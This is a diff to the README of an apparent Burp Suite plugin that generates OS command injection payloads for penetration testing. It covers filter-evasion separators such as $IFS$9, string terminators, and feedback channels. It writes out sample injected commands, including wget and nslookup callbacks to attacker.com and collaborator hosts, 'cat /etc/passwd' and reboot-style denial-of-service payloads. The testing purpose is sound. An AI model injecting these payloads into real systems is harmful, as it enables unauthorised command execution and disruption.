@@ -149,10 +149,11 @@ A way to achieve this is an expression like `$IFS$9`, so the alternative payload
 In the unix environment, the `$IFS` environmental variable contains the current argument separator value (which is space by default).
 Special caution needs to be taken when injecting `$IFS` as the argument separator. It is critical to make sure that the OS shell will be able to understand where does the variable name end and therefore where does the actual argument start. `ping$IFSlocalhost` will NOT work, because the shell will try to extrapolate a variable called `$IFSlocalhost` - which is obviously not defined. To deal with this, we can insert additional `$9`, which is just a holder of the ninth argument of the current system shell process (which is always an empty string). 
 Interestingly, the same principle does not seem to apply to commands like `init$IFS$96` (init 6 -> restart). The command works fine and the shell is not trying to insert variable $96. Instead, it recognizes the presence of `$9`, evaluates it to an empty string and therefore treats the following `6` as an argument.
-A way to avoid this confusion is to use the `${IFS}` bracketed expression - just keep in mind this involves the use of two more characters that are likely to be filtered `{` and `}`.
+A way to avoid this confusion is to use the `${IFS}` bracketed expression - just keep in mind this involves the use of two more characters that are likely to be filtered (`{` and `}`).
 
 
-Below is the list of currently known and supported argument separators:
+Below is the list of currently known and supported argument separators.
+
 On nix:
 - `%20` - space
 - `%09` - horizontal tab
@@ -199,7 +200,7 @@ It WOULD work, here's why:
 
 * ![Little test](screenshots/win_shellshock.png?raw=true "Little test")
 
-* https://www.thesecurityfactory.be/command-injection-windows.html - the Windows version of the "shellshock" vuln :D
+* This behavior was described long time ago, being called the "Windows version" of the famous bash shellshock vulnerability (https://www.thesecurityfactory.be/command-injection-windows.html)
 
 I am still hoping for some undocumented cmd.exe function that will allow to forge `&` by some sort of single expression. More research is needed.
 
@@ -212,7 +213,8 @@ Hence, I really hoped for expression like `ls .${LS_COLORS:10:1}id` to work (eva
 Additionally, the following string terminators can be used (in case input was written into a file or a database before execution and our goal was to get rid of everything appended to our payload in order to avoid syntax issues):
 - `%00` (nullbyte)
 - `%F0%9F%92%A9` (Unicode poo character, known to cause string termination in db software like MySQL)
-- `%20#` - space followed by the hash sign
+- `%20#` - space followed by the hash sign (nix)
+- `%20::` -  space followed by the `::` cmd.exe one-line comment sequence
 
 This way the base payload set is multiplied by all the feasible combinations of alternative argument separators, command separators and command terminators.
 
@@ -256,7 +258,7 @@ This makes us extend our base payload set to combinations like:
 
 ## Platform-specific conditions
 
-Depending on the technology we are dealing with, some payloads working on some systems will fail on other. The examples include:
+Depending on the technology we are dealing with, some payloads working on some systems will fail on the other. The examples include:
 - using windows-specific command on a nix-like system
 - using nix-like specific argument separator on a windows system
 - dealing with a different underlying system shell (e.g. `cat /etc/passwd #'` will work on bash/ash/dash, but won't work on csh)
@@ -288,12 +290,12 @@ The above script is synchronous, but does not return output. An alternative that
 So, using all the variations of test commands like cat /etc/passwd or echo test would lead to false negatives, because the output is never returned to the browser.
 This is why we need alternative feedback channels (which do not necessarily mean ouf of band channels - this terminology rather refers to the way of extracting data). 
 
-A feedback channel is simply the way we collect the indicator of a successful injection.
+A feedback channel is simply the way we collect the indicator of a successful injection/suspicious behavior.
 
 Hence, for command injection, we can have the following feedback channels:
 - output (all the above examples except the last one use directly returned output, could as well be indirectly returned, e.g. visible in some other module, put into a file, sent via email and so on, all depending on what the vulnerable feature does and how it returns results)
 - response time (e.g. commands like sleep 30 will case noticeable half-minute delay, confirming that the injection was successful, however this will not work with asynchronous scripts)
-- network traffic, like reverse HTTP connections (wget http://a.collaborator.example.org), ICMP ping requests or/and DNS lookups (ping sub.a.collaborator.example.org)
+- network traffic, like reverse HTTP connections (`wget http://a.collaborator.example.org`), ICMP ping requests or/and DNS lookups (ping sub.a.collaborator.example.org)
 - file system (if we have access to it; we can attempt to inject commands like `touch /tmp/cmdinject` and then inspect the `/tmp` directory if the file was created - or have the customer to do it for us)
 - availability (if all the above fails/is not an option, the only way (without involving third parties) to confirm that the injected command has executed, would be an injection of some sort of payload causing a DoS condition like reboot, shutdown or remove)
 
@@ -302,43 +304,101 @@ In order to avoid false negatives, when no command output is returned by the app
 
 
 # Using the tool
+This section focuses only on explaining the main concepts and their implementation, without describing obvious and/or least important options. Most of the sections below are somehow related and it was not that easy to decide in what order they should be presented. Hence, if anything seems unclear and questions arise, just keep reading on.
+
+The default settings the plugin loads with should be optimum for most scenarios, so the tool can be used out of the box without any adjustments.
 
 ## Feedback channels
-Two out of above mentioned feedback channels (DNS and time) are supported automatically (can be used out of the box without any additional tools and actions). Feel free to use other feedback channels (manual mode) whenever necessary.
+Two out of above mentioned feedback channels (*DNS* and *time*) are fully supported (can be used out of the box without any additional tools or manual actions taken) in the *auto* mode. Feel free to use other feedback channels (*manual* mode only) whenever necessary.
 
 ### DNS
+In order to catch both synchronous and asynchronous interactions with our payloads, the tool is using [Burp Collaborator] (https://portswigger.net/burp/help/collaborator).
+
+Burp Collaborator is heavily used by the Burp Active Scanner. 
+
+It can as well be used manually (just click on 'Burp'->'Burp Collaborator Client' and try it out yourself), so it can be combined with manual or semi-automated attacks (Repeater, Intruder, tampering through proxy, forging files, using external tools and so on).
+
+Luckily, Burp Suite also provides Burp Collaborator API so it can be used by extensions (and this is exactly what this plugin is doing when *DNS* feedback channel is used).
+
+Service-wise, please keep in mind you can either use the default Collaborator service provided by Portswigger or set up your own. 
+
+Having and using a private Collaborator service makes more sense if we set it up with a domain name as short as possible, like x.yz, so the domain names used in the payloads can look like `55.5aglyjo4e8v6j2ot2f255fraw12rqg.n.xy.z` instead of `55.5aglyjo4e8v6j2ot2f255fraw12rqg.burpcollaborator.net`. The longer our payload is, the higher chances for a false negative (the application might reject our payload due to its excessive length before it reaches the vulnerable code).
+
+Also, it's good to always run a health check of the Collaborator service before actually using it.
 
 ### time
+This is a well known feedback channel for detecting so called 'blind' variant of injection vulnerabilities. It's faster and it does not require external service like DNS. Also, the payloads are shorter. It shouold still be considered less reliable as it will NOT detect asynchronous vulnerabilities, whereas the payload is stored first and then executed by a different process or even system.
+Upon successful execution, payloads utilizing this feedback channel (e.g. `sleep 25`) cause a significant delay in the response.
 
 ## Payload marking
 The payload marking mechanism is very simple. Every single payload generated by the tool has its number (starting at 1). 
 If payload marking feature is on, upon generation, all instances of the special holder string `PAYLOAD_MARK` in the argument field are replaced with the payload number. This makes it easier to trace back the result to the successful payload that created it. 
+
 For example, if the command is set to `touch` and the argument is set to `/tmp/owned.PAYLOAD_MARK`, once the attack is finished and there is a file named /tmp/owned.1337, we know that payload number 1337 was the one responsible for creating the file. 
+
 We could likewise do something like command=`echo` and argument=`PAYLOAD_MARK>>/tmp/owned`. This way the file `/tmp/owned` would contain all the IDs of the payloads that worked.
-Third example could be command=`wget` and argument=`http://attacker.com/owned.PAYLOAD_MARK` if attacker.com is our controlled server to observe interactions.
-Fourth example could be command=`nslookup` and argument=`PAYLOAD_MARK.collaborator.attacker.com`, so if our DNS server receives a lookup like `66.collaborator.attacker.com`, we know it was triggered by the 66th payload. 
+
+The third example could be command=`wget` and argument=`http://attacker.com/owned.PAYLOAD_MARK` if attacker.com is our controlled server to observe interactions.
+
+The fourth example could be command=`nslookup` and argument=`PAYLOAD_MARK.collaborator.attacker.com`, so if our DNS server receives a lookup like `66.collaborator.attacker.com`, we know it was triggered by the 66th payload. 
 
 If payload marking feature is off, the `PAYLOAD_MARK` holder - if present - is simply removed from the eventual payload.
 
 ## Difference between manual and automatic mode
-The mode setting only applies to Intruder and Export (and is ignored by the Active Scanning extension, which is always using the automated mode regardless to this setting).
+The mode setting only applies to Intruder and Export (and is ignored by the Active Scanning extension, which is always using the *auto* mode regardless to this setting).
 
 ### The auto mode 
 This mode is enabled by default and recommended.
-The automatic mode does not allow one to explicitly specify the command to be injected and neither its argument. In this mode, the actual command used in the payload depends on the feedback channel (e.g. `nslookup` vs `sleep`) and the target OS (e.g. `sleep 25` for nix and `ping -n 25 localhost` for win, because `sleep` is not a thing in win). 
+The automatic mode does not allow one to explicitly specify the command to be injected and neither its argument. In this mode, the actual command used in the payload depends on the feedback channel (e.g. `nslookup` vs `sleep`) and the target OS (e.g. `sleep 25` for nix and `ping -n 25 localhost` for win, because `sleep` is not a thing on win). Also, whereas *DNS* serves as the feedback channel, payload marking is enforced. 
+
+#### Combining Intruder with Collaborator
+The coolest thing about the *auto* mode is the automated use of the Burp Collaborator service without the need to:
+* manually running the Burp Collaborator Client
+* copying the domain names from it ("Copy to clipboard")
+* putting them into our payloads/configuration
+* keeping the Burp Collaborator Client window open, watching it for interactions
+
+Again, this mode is always used by the Scanner extension anyway regardless to the setting, which means this setting only applies to Intruder and Export. Yes, this means that by default Intruder attacks using payloads provided by this tool WILL DETECT Collaborator interactions (either right away or long after the attack was finished) ... and *create issues in the Target, just like they came from the Scanner*! 
+
+Every time a set of payloads is generated (in result of running an Active Scan, an Intruder attack or an Export to file/clipboard) with *DNS* as the feedback channel, SHELLING requests the Collaborator service to create a new unique subdomain (just like if we hit the "Copy to clipboard" button in the Burp Collaborator Client - except it happens automatically) and remembers it after the payload set is generated. Every time the Collaborator Service returns interactions, they are all matched against all the domains generated and tracked till this point. By matching the subdomain and the payload marker, it is possible to identify the exact payload/payloads that caused it and (for Scanner and Intruder) trace the base request used for the attack. This set of information is sufficient for automatic insertion of a new issue to the 'Issues' list in the 'Site Map', both for Active Scanning and Intruder attacks (this won't work for Export only because there is no base request associated with its instance). See the Intruder section for an actual example (you won't see this trick in any other Burp plugin :D).
+
+##### Why?
+The main reason for implementing this Collaborator-enabled, Scanner-like capability for Intruder was the same reason we use Intruder. Sometimes we do not want to run a full Active Scan of a particular insertion point (with all the Scanner checks enabled, while disabling them just for one scanning task only to enable them again right after running it would be even more cumbersome), but instead we only want to test that insertion point for a particular vulnerability, like OS command injection. Also, Intruder gives us insight into the responses than the Scanner (speaking of which, see this).
 
 ### Manual mode
-The manual mode does not allow one to specify the feedback channel. In turn, it gives control over the command and argument.
+The manual mode does not allow one to specify the feedback channel, as we take care of the feedback channel ourselves.
+
+In turn, it gives control over the command and argument, so we can use a configuration like command=`touch` with argument=`/tmp/owned.PAYLOAD_MARK` (payload marking can be still used with manual mode), making the file system our feedback channe.
+
+Another example would be command=`echo` and argument = `1337`. Then we add `1337` to the 'Grep - match' option of the Intruder attack, using the direct output as the feedback channel (without payload marking).
+
+Also, payload marking does not make much sense when using time as the feedback channel (there either is a significant delay or not). But of course we could still do it in manual mode: command=`sleep` and argument=`PAYLOAD_MARK`, so if the payload works, the additional delay in seconds will be equal to the payload number.
 
 ## Different approaches to using this tool
+With its default configuration, SHELLING currently generates around 200 payloads (using most reasonable base syntaxes, terminator and encoding settings). This is a relatively high number and it will be reduced in future release, with the default setting going moving best effort payloads (so ideally the tool would only be using the user-defined 'X' first payloads from the list ordered by the likelihood of success).
+
+With all possible options enabled (all base syntaxes, target operating systems, evasive techniques and other types of injections) this number grows to thousands. 
+
+Therefore, using the full payload set is obviously not reliable for normal testing and is in my opinion an example of what what James Kettle called "the million payload approach" - explaining that Scanners have to provide so called "best effort payloads".
+
+I personally believe that the full payload set provides us with high confidence about the profoundness of the test we conducted against the particular input, but for practical reasons this approach should only be taken against features with high likelihood of calling local system binaries/scripts (like any system, diagnostic or file tools).
+
+Another scenario for using the full payload set are inputs that behave in a suspicious way (e.g. potential code injection issues detected by the Backslash Powered Scanner) and we are trying to guess the proper syntax and other input conditions - or at least partially automate and therefore speed up the guessing process, providing us with the clear list of payloads we have already tried.
+
 ## Scanner
 ## Intruder
+### Example 1: Intruder in manual mode
+### Example 2: Intruder in auto mode
+
+
 ## Export
 ## Byte generator
 
 ## Other recommended tools and projects
 ### Backslash Powered Scanner
 ### Flow
+[Flow] (https://github.com/PortSwigger/flow) is a great plugin to monitor and search ALL the traffic going through Burp, I find it extremely useful).
+
 ### Error message checks
 ### Daniel's research
 
